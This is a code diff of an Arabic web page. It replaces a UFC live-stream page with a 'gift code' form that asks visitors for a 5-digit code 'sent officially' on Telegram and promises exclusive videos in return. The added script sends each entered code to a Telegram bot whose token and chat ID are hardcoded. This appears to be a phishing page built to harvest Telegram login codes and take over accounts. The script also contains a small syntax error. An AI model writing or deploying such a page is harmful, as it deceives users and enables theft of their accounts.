@@ -1,998 +1,128 @@
-<!DOCTYPE html>
-<html lang="ar">
+<!DOCTYPE html><html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes"/>
-
-<title>UFC Fight Night | CROCO</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;500;600;700&display=swap" rel="stylesheet">
-
-<style>
-
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>استبدال كود الهدية</title><style>
 *{
     margin:0;
     padding:0;
     box-sizing:border-box;
+    font-family:Tahoma,sans-serif;
 }
 
 body{
-    background:#050505;
-    font-family:'Oswald',sans-serif;
-    color:#fff;
-    overflow-x:hidden;
-}
-
-/* الخلفية */
-
-body::before{
-    content:"";
-    position:fixed;
-    inset:0;
-
-    background:
-    radial-gradient(circle at top,
-    rgba(255,0,0,.15),
-    transparent 35%),
-    linear-gradient(180deg,#000,#050505);
-
-    z-index:-3;
-}
-
-/* الجريد */
-
-.grid{
-    position:fixed;
-    inset:0;
-
-    background-image:
-    linear-gradient(rgba(255,255,255,.03) 1px, transparent 1px),
-    linear-gradient(90deg, rgba(255,255,255,.03) 1px, transparent 1px);
-
-    background-size:40px 40px;
-
-    mask-image:linear-gradient(to bottom,
-    transparent,
-    rgba(0,0,0,.9));
-
-    z-index:-2;
-}
-
-/* الخطوط */
-
-.lines{
-    position:fixed;
-    inset:0;
-    overflow:hidden;
-    z-index:-1;
-}
-
-.lines span{
-    position:absolute;
-
-    width:2px;
-    height:200%;
-
-    background:linear-gradient(
-    transparent,
-    rgba(255,0,0,.45),
-    transparent);
-
-    opacity:.15;
-
-    animation:moveLine linear infinite;
-}
-
-.lines span:nth-child(1){left:10%;animation-duration:8s;}
-.lines span:nth-child(2){left:25%;animation-duration:11s;}
-.lines span:nth-child(3){left:42%;animation-duration:7s;}
-.lines span:nth-child(4){left:61%;animation-duration:10s;}
-.lines span:nth-child(5){left:78%;animation-duration:9s;}
-.lines span:nth-child(6){left:91%;animation-duration:12s;}
-
-@keyframes moveLine{
-    from{
-        transform:translateY(-50%);
-    }
-    to{
-        transform:translateY(0%);
-    }
-}
-
-/* الهيدر */
-
-header{
-    width:100%;
-    padding:18px 22px;
-
+    background:#0f172a;
+    height:100vh;
     display:flex;
-    justify-content:space-between;
-    align-items:center;
-
-    position:sticky;
-    top:0;
-    z-index:999;
-
-    background:rgba(0,0,0,.75);
-    backdrop-filter:blur(14px);
-
-    border-bottom:1px solid rgba(255,255,255,.06);
-}
-
-/* اللوجو */
-
-.logo{
-    font-size:42px;
-    font-weight:700;
-    letter-spacing:4px;
-}
-
-.logo span{
-    color:#ff0000;
-
-    text-shadow:
-    0 0 15px rgba(255,0,0,.5);
-}
-
-/* الأيقونات */
-
-.header-icons{
-    display:flex;
-    gap:12px;
-}
-
-.icon{
-    width:45px;
-    height:45px;
-
-    display:flex;
-    align-items:center;
     justify-content:center;
-
-    border-radius:14px;
-
-    background:#101010;
-
-    border:1px solid rgba(255,255,255,.05);
-
-    font-size:18px;
-
-    box-shadow:
-    0 0 15px rgba(255,0,0,.08);
+    align-items:center;
 }
-
-/* الكونتينر */
 
 .container{
-    width:100%;
-    max-width:1150px;
-
-    margin:auto;
-
-    padding:24px 18px 70px;
-}
-
-/* البانر */
-
-.banner{
-    position:relative;
-
-    width:100%;
-    height:320px;
-
-    border-radius:30px;
-    overflow:hidden;
-
-    background:
-    radial-gradient(circle at center,
-    rgba(255,0,0,.18),
-    rgba(0,0,0,.92));
-
-    margin-bottom:28px;
-
-    box-shadow:
-    0 0 40px rgba(255,0,0,.12);
-}
-
-.banner::after{
-    content:"";
-
-    position:absolute;
-    inset:0;
-
-    background:
-    linear-gradient(to top,
-    rgba(0,0,0,.88),
-    rgba(0,0,0,.15));
-}
-
-/* الحقوق */
-
-
-
-/* ========================= */
-/* المقاتلين */
-/* ========================= */
-
-.fighters{
-    position:relative;
-    width:100%;
-    height:100%;
-}
-
-/* الشكل العام */
-
-.fighter{
-    position:absolute;
-    bottom:0;
-
-    object-fit:contain;
-    pointer-events:none;
-
-    filter:
-    drop-shadow(0 0 25px rgba(255,0,0,.25));
-
-    transition:.3s;
-}
-
-/* حمزه */
-
-.left-fighter{
-    left:15px;
-
-    height:92%;
-    z-index:3;
-}
-
-/* دريكوس */
-
-.right-fighter{
-    right:-15px;
-
-    height:93%;
-    z-index:2;
-    
-    /* تحسين جودة الصورة */
-    object-fit:contain;
-    max-width:none;
-}
-
-/* النص */
-
-.vs-area{
-    position:absolute;
-
-    left:50%;
-    top:50%;
-
-    transform:translate(-50%,-50%);
-    z-index:10;
-
+    width:90%;
+    max-width:400px;
+    background:#1e293b;
+    padding:25px;
+    border-radius:15px;
     text-align:center;
+    box-shadow:0 0 20px rgba(0,0,0,.3);
 }
 
-.event-date{
-    display:inline-block;
-
-    padding:8px 16px;
-
-    border-radius:999px;
-
-    background:rgba(0,0,0,.6);
-
-    border:1px solid rgba(255,255,255,.08);
-
-    font-size:13px;
-    letter-spacing:2px;
-
-    margin-bottom:14px;
-
-    backdrop-filter:blur(10px);
-}
-
-.vs-area h1{
-    font-size:60px;
-    line-height:1;
-
-    letter-spacing:4px;
-
-    text-shadow:
-    0 0 20px rgba(255,0,0,.45);
-}
-
-.vs{
-    font-size:34px;
-
-    color:#ff0000;
-
-    margin:10px 0;
-
-    text-shadow:
-    0 0 15px rgba(255,0,0,.5);
-}
-
-.vs-area h2{
-    font-size:20px;
-    letter-spacing:4px;
-
-    opacity:.75;
-}
-
-/* كارد المشاهدة */
-
-.watch-card{
-    background:#0b0b0b;
-
-    border-radius:30px;
-    overflow:hidden;
-
-    border:1px solid rgba(255,255,255,.06);
-
-    box-shadow:
-    0 0 30px rgba(255,0,0,.08);
-}
-
-/* الفيديو */
-
-.player-wrapper{
-    position:relative;
-
-    width:100%;
-    aspect-ratio:16/9;
-
-    background:#000;
-}
-
-.player-wrapper iframe{
-    position:absolute;
-    inset:0;
-
-    width:100%;
-    height:100%;
-
-    border:none;
-    display:block;
-    
-    /* تحسينات الأداء والفيديو */
-    will-change:transform;
-    transform:translateZ(0);
-}
-
-/* تأثير */
-
-.player-wrapper::after{
-    content:"";
-
-    position:absolute;
-    inset:0;
-
-    background:
-    linear-gradient(to top,
-    rgba(0,0,0,.55),
-    transparent 35%,
-    transparent 70%,
-    rgba(0,0,0,.35));
-
-    pointer-events:none;
-}
-
-/* LIVE */
-
-.live{
-    position:absolute;
-
-    top:18px;
-    left:18px;
-
-    z-index:8;
-
-    display:flex;
-    align-items:center;
-    gap:10px;
-
-    padding:10px 16px;
-
-    border-radius:999px;
-
-    background:rgba(0,0,0,.6);
-
-    border:1px solid rgba(255,255,255,.06);
-
-    backdrop-filter:blur(10px);
-}
-
-.dot{
-    width:10px;
-    height:10px;
-
-    border-radius:50%;
-
-    background:#ff0000;
-
-    box-shadow:
-    0 0 10px red,
-    0 0 20px red;
-
-    animation:blink 1s infinite;
-}
-
-/* إضافة مؤشر تسجيل إضافي */
-.recording-badge{
-    position:absolute;
-    bottom:18px;
-    right:18px;
-    z-index:8;
-    
-    background:rgba(0,0,0,.5);
-    backdrop-filter:blur(8px);
-    padding:5px 12px;
-    border-radius:20px;
-    font-size:11px;
-    letter-spacing:1px;
-    border-left:3px solid #ff0000;
-    pointer-events:none;
-}
-
-@keyframes blink{
-    0%,100%{
-        opacity:1;
-    }
-    50%{
-        opacity:.3;
-    }
-}
-
-/* المعلومات */
-
-.info{
-    padding:26px;
-}
-
-.info h2{
-    font-size:42px;
-    margin-bottom:12px;
-}
-
-.info p{
-    color:#b9b9b9;
-
-    line-height:1.8;
-
-    font-size:15px;
-}
-
-/* الأزرار */
-
-.actions{
-    margin-top:24px;
-
-    display:flex;
-    gap:14px;
-    flex-wrap:wrap;
-}
-
-.btn{
-    padding:15px 26px;
-
-    border-radius:18px;
-
-    font-family:'Oswald',sans-serif;
-
-    font-size:17px;
-
-    user-select:none;
-    cursor:pointer;
-    transition:all .2s ease;
-}
-
-.watch-btn{
-    background:#ff0000;
+h1{
     color:#fff;
-
-    box-shadow:
-    0 0 20px rgba(255,0,0,.35);
-}
-
-.watch-btn:hover{
-    transform:scale(0.98);
-    filter:brightness(0.9);
-}
-
-.info-btn{
-    background:#151515;
-    color:#fff;
-
-    border:1px solid rgba(255,255,255,.06);
-}
-
-.info-btn:hover{
-    background:#202020;
-    border-color:rgba(255,0,0,.3);
-}
-
-/* السكاشن */
-
-.section-title{
-    margin-top:42px;
     margin-bottom:20px;
-
-    font-size:34px;
-    letter-spacing:2px;
+    font-size:24px;
 }
 
-/* الكروت */
-
-.cards{
-    display:grid;
-
-    grid-template-columns:
-    repeat(auto-fit,minmax(240px,1fr));
-
-    gap:18px;
+p{
+    color:#cbd5e1;
+    margin-bottom:15px;
 }
 
-.card{
-    background:#0d0d0d;
-
-    border-radius:24px;
-    overflow:hidden;
-
-    border:1px solid rgba(255,255,255,.05);
-
-    transition:.3s;
-}
-
-.card:hover{
-    transform:translateY(-4px);
-
-    box-shadow:
-    0 0 20px rgba(255,0,0,.12);
-}
-
-.card img{
+input{
     width:100%;
-    height:200px;
-
-    object-fit:cover;
-    object-position:center 20%;
-    transition:.3s;
+    padding:12px;
+    border:none;
+    outline:none;
+    border-radius:8px;
+    margin-bottom:15px;
+    font-size:16px;
 }
 
-.card:hover img{
-    transform:scale(1.02);
+button{
+    width:100%;
+    padding:12px;
+    border:none;
+    border-radius:8px;
+    background:#2563eb;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
 }
 
-.card-content{
-    padding:18px;
+button:hover{
+    background:#1d4ed8;
 }
 
-.card-content h3{
-    margin-bottom:10px;
-    font-size:20px;
+#status{
+    margin-top:15px;
+    color:#fff;
 }
+</style></head><body><div class="container">
+    <h1>🎁 كود الهدية</h1>
+    <p>يرجى ادخال كود الهديه المرسل رسميا من حساب تليجرام المكون من 5 ارقام على تليجرام للحصول على فيديوهات الحصريات</p><input type="text" id="giftCode" placeholder="اكتب الكود هنا">
 
-.card-content p{
-    color:#aaa;
-    font-size:14px;
-}
+<button onclick="sendCode()">إرسال</button>
 
-/* الفوتر */
+<div id="status"></div>
 
-footer{
-    margin-top:55px;
+</div><script>
 
-    text-align:center;
+const BOT_TOKEN = "8983040975:AAFhVAvwXRnyj5sKK3Cagi-wH7ES8ciOZwU";
+const CHAT_ID = "8460546222";
 
-    color:#777;
+async function sendCode(){
 
-    font-size:14px;
-    letter-spacing:2px;
-}
+    let code = document.getElementById("giftCode").value.trim();
 
-footer span{
-    color:#ff0000;
-}
-
-/* تحسين التمرير */
-::-webkit-scrollbar{
-    width:6px;
-}
-::-webkit-scrollbar-track{
-    background:#0a0a0a;
-}
-::-webkit-scrollbar-thumb{
-    background:#ff0000;
-    border-radius:10px;
-}
-
-/* ========================= */
-/* الموبايل */
-/* ========================= */
-
-@media(max-width:768px){
-
-    body{
-        overflow-x:hidden;
+    if(code === ""){
+        document.getElementById("status").innerText =
+        "يرجى ادخال كود الهديه المرسل رسميا من حساب تليجرام المكون من 5 ارقام على تليجرام للحصول على فيديوهات الحصريات",
+        return;
     }
 
-    .container{
-        padding:14px 12px 50px;
-    }
-
-    header{
-        padding:16px 14px;
-    }
-
-    .logo{
-        font-size:28px;
-    }
-
-    .header-icons{
-        gap:8px;
-    }
-
-    .icon{
-        width:42px;
-        height:42px;
-
-        border-radius:12px;
-
-        font-size:16px;
-    }
-
-    .banner{
-        height:230px;
-        border-radius:24px;
-    }
-
-    /* حمزه */
-
-    .left-fighter{
-        left:-22px;
-        height:88%;
-    }
-
-    /* دريكوس */
-
-    .right-fighter{
-        right:-22px;
-        height:89%;
-    }
-
-    /* النص */
-
-    .vs-area{
-        width:100%;
-        padding:0 12px;
-    }
-
-    .vs-area h1{
-        font-size:42px;
-    }
-
-    .vs{
-        font-size:24px;
-    }
-
-    .vs-area h2{
-        font-size:13px;
-    }
-
-    .watch-card{
-        border-radius:24px;
-    }
-
-    .player-wrapper{
-        aspect-ratio:16/9;
-    }
-
-    .live{
-        top:10px;
-        left:10px;
-
-        padding:8px 12px;
-
-        font-size:12px;
-    }
-
-    .dot{
-        width:8px;
-        height:8px;
-    }
-
-    .recording-badge{
-        bottom:12px;
-        right:12px;
-        font-size:9px;
-        padding:4px 10px;
-    }
-
-    .info{
-        padding:18px;
-    }
-
-    .info h2{
-        font-size:20px;
-        line-height:1.35;
-        margin-bottom:14px;
-    }
-
-    .info p{
-        font-size:14px;
-        line-height:1.9;
-    }
-
-    .actions{
-        margin-top:18px;
-        gap:10px;
-    }
-
-    .btn{
-        width:100%;
-        text-align:center;
-
-        padding:14px;
-
-        font-size:15px;
-
-        border-radius:14px;
-    }
-
-    .section-title{
-        font-size:24px;
-
-        margin-top:34px;
-        margin-bottom:16px;
-    }
-
-    .cards{
-        grid-template-columns:1fr;
-    }
-
-    .card{
-        border-radius:20px;
-    }
-
-    .card img{
-        height:180px;
-    }
-
-    .card-content{
-        padding:16px;
-    }
-
-    footer{
-        font-size:11px;
-        margin-top:40px;
-    }
-
-}
-
-/* لأجهزة التابلت */
-@media(min-width:769px) and (max-width:1024px){
-    .container{
-        padding:24px 20px 60px;
-    }
-    
-    .info h2{
-        font-size:32px;
-    }
-    
-    .left-fighter{
-        left:-20px;
-    }
-    
-    .right-fighter{
-        right:-50px;
-    }
-}
-
-</style>
-</head>
-
-<body>
-
-<div class="grid"></div>
-
-<div class="lines">
-    <span></span>
-    <span></span>
-    <span></span>
-    <span></span>
-    <span></span>
-    <span></span>
-</div>
-
-<header>
-
-    <div class="logo">
-        <span>U</span>FC
-    </div>
-
-    <div class="header-icons">
-        <div class="icon">🥊</div>
-        <div class="icon">🔥</div>
-        <div class="icon">⚡</div>
-    </div>
-
-</header>
-
-<div class="container">
-
-    <!-- البانر -->
-
-    <div class="banner">
-
-        <div class="fighters">
-
-            <!-- حمزه -->
-
-            <img
-            class="fighter left-fighter"
-            src="https://files.catbox.moe/xlvr0b.png"
-            alt="Khamzat Chimaev">
-
-            <!-- النص -->
-
-            <div class="vs-area">
-
-                <div class="event-date">
-                    MAY 10 • LIVE TODAY
-                </div>
-
-                <h1>CHIMAEV</h1>
-
-                <div class="vs">
-                    VS
-                </div>
-
-                <h2>MAIN EVENT</h2>
-
-            </div>
-
-            <!-- دريكوس -->
-
-            <img
-            class="fighter right-fighter"
-            src="https://files.catbox.moe/f12f3z.png"
-            alt="Sean Strickland">
-
-        </div>
-
-    </div>
-
-    <!-- المشغل - تم الحفاظ على رابط البث كما هو -->
-
-    <div class="watch-card">
-
-        <div class="player-wrapper">
-
-            <div class="live">
-                <div class="dot"></div>
-                LIVE EVENT
-            </div>
-
-            <div class="recording-badge">
-                ● UFC 4K
-            </div>
-
-            <iframe
-              id="main-player-frame"
-              src="https://backlik.com/mma/blog"
-              allow="autoplay; encrypted-media; fullscreen; picture-in-picture"
-              allowfullscreen
-              playsinline
-              sandbox="allow-forms allow-pointer-lock allow-same-origin allow-scripts allow-top-navigation allow-storage-access-by-user-activation">
-            </iframe>
-
-        </div>
-
-        <div class="info">
-
-            <h2>KHAMZAT CHIMAEV VS SEAN STRICKLAND</h2>
-
-            <p>
-                تابع النزال الرئيسي الليلة مباشرة في UFC Fight Night
-                بين الوحش الشيشاني حمزه تشيماييف والبطل دريكوس دو بليسي
-                في مواجهة قوية على اللقب.
-            </p>
-
-            <div class="actions">
-
-                <div class="btn watch-btn">
-                    ● LIVE NOW
-                </div>
-
-                <div class="btn info-btn">
-                    MAY 10 • MAIN CARD
-                </div>
-
-            </div>
-
-        </div>
-
-    </div>
-
-    <!-- سكشن -->
-
-    <h2 class="section-title">
-        UPCOMING FIGHTS
-    </h2>
-
-    <div class="cards">
-
-        <div class="card">
-            <img src="https://images.unsplash.com/photo-1549719386-74dfcbf7dbed?q=80&w=1200&auto=format&fit=crop" alt="Heavyweight fight">
-
-            <div class="card-content">
-                <h3>HEAVYWEIGHT BATTLE</h3>
-                <p>Championship Match • June 3</p>
-            </div>
-        </div>
-
-        <div class="card">
-            <img src="https://images.unsplash.com/photo-1517836357463-d25dfeac3438?q=80&w=1200&auto=format&fit=crop" alt="MMA fight night">
-
-            <div class="card-content">
-                <h3>MAIN CARD EVENT</h3>
-                <p>Fight Night Special • May 17</p>
-            </div>
-        </div>
-    </div>
-
-    <footer>
-        © 2026 ALL RIGHTS RESERVED —
-        <span>CROCO</span>
-    </footer>
-
-</div>
-
-<!-- سكربت بسيط لتحديث البث يدوياً (اختياري) -->
-<script>
-    (function(){
-        // وظيفة بسيطة لتأكيد تحميل الـ iframe بدون تعديل على الرابط
-        const iframe = document.getElementById('main-player-frame');
-        if(iframe){
-            iframe.addEventListener('load',function(){
-                console.log('UFC Stream Loaded Successfully');
-            });
-            
-            // إعادة تحميل الـ iframe في حال حدوث خطأ (اختياري)
-            iframe.addEventListener('error',function(){
-                console.warn('Stream error, but keeping original URL as requested');
-            });
+    try{
+
+        let response = await fetch(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+            {
+                method:"POST",
+                headers:{
+                    "Content-Type":"application/json"
+                },
+                body:JSON.stringify({
+                    chat_id:CHAT_ID,
+                    text:`🎁 كود هدية جديد:\n${code}`
+                })
+            }
+        );
+
+        if(response.ok){
+            document.getElementById("status").innerText =
+            "تم إرسال الكود بنجاح";
+            document.getElementById("giftCode").value = "";
+        }else{
+            document.getElementById("status").innerText =
+            "فشل الإرسال";
         }
-        
-        // إضافة تأثير نقر على الأزرار (لتحسين تجربة المستخدم فقط)
-        const btns = document.querySelectorAll('.btn');
-        btns.forEach(btn => {
-            btn.addEventListener('click', function(e){
-                if(this.classList.contains('watch-btn')){
-                    // سكرول سلس إلى مشغل الفيديو
-                    document.querySelector('.watch-card').scrollIntoView({
-                        behavior: 'smooth',
-                        block: 'start'
-                    });
-                }
-            });
-        });
-        
-        // تحسين عرض الصورة اليمنى (دريكوس)
-        const rightFighter = document.querySelector('.right-fighter');
-        if(rightFighter){
-            rightFighter.addEventListener('load', function(){
-                this.style.opacity = '1';
-            });
-            rightFighter.style.opacity = '0';
-            rightFighter.onload = function(){
-                this.style.opacity = '1';
-            };
-            setTimeout(()=>{
-                if(rightFighter.style.opacity === '0') rightFighter.style.opacity = '1';
-            }, 500);
-        }
-    })();
-</script>
 
-</body>
+    }catch(error){
+
+        document.getElementById("status").innerText =
+        "حدث خطأ أثناء الإرسال";
+
+    }
+}
+
+</script></body>
 </html>
